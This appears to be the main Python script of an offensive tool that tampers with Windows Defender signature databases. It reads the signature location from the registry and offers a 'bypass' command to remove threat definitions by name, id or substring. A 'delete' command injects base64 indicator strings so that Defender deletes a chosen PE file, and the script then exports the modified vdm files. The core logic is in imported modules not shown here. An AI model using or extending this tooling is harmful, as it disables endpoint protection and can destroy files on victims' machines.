import json
import base64
import winreg
import logging
import argparse

from core.utils import version_banner
from core.utils.logger import init_logger
from core.definitions import Definitions

from core.features.delete import DeletePEMockFile

def get_defualt_definition_update_path() -> str:
    logging.info("Getting Signatures Location ...")
    location = winreg.HKEY_LOCAL_MACHINE
    defender_key = winreg.OpenKeyEx(location, r"SOFTWARE\Microsoft\Windows Defender\Signature Updates")
    signature_location = winreg.QueryValueEx(defender_key, "SignatureLocation")
    
    return signature_location[0]

def router(args, definitions: Definitions):
    if args.command == 'bypass':
        pass
    elif args.command == 'delete':
        string = base64.b64decode(args.string)
        hstrs = [string]
        DeletePEMockFile(definitions.get_anti_spayware_definitions(), hstrs).run()    
    else:
        logging.error(f"Unrecognized command: {args.command}")
        exit(1)

    definitions.export(args.o)

def argument_parser():
    options = argparse.ArgumentParser(usage="%(prog)s command [options]", add_help = True, description = "Windows Defender Update")
    options.add_argument('-o', default='.', help='output folder for the exported vdm files')
    options.add_argument('-d', default=get_defualt_definition_update_path(), help='set explicit definition update path')
    subparsers = options.add_subparsers(dest='command', required=True)

    bypass_subparser = subparsers.add_parser('bypass', help='bypass windows defender threats')
    bypass_group = bypass_subparser.add_mutually_exclusive_group()
    bypass_group.add_argument('-match', help="delete all threats that his name containes <name>")
    bypass_group.add_argument('-name', help="delete threat by name")
    bypass_group.add_argument('-id', help="delete threat by his id")
    
    delete_parser = subparsers.add_parser('delete', help='delete file by modifiyng rules')
    delete_parser.add_argument('--string', help='indication strings within the pefile (base64)', required=True)
    
    return options.parse_args()

def main():
    init_logger()
    print(version_banner())

    args = argument_parser()

    logging.info(f'Definitions Path: {args.d}')
    definations_path = args.d
    definitions = Definitions(definations_path)

    router(args, definitions)

if __name__ == "__main__":
    main()